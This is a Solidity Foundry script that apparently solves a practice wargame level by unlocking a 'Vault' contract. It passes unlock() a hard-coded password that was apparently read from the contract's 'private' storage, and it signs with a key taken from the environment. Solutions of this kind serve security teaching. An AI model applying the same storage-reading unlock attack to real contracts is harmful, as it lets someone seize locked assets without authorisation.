// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level8.sol";
import "forge-std/Script.sol";

contract ExploitLevel8 is Script {
    Vault instance = Vault(0x64f630b9B9035B21413fB85C0CAB5ADd53049587);
    bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        instance.unlock(password);
        console.log("Locked?", instance.locked());
    }
}
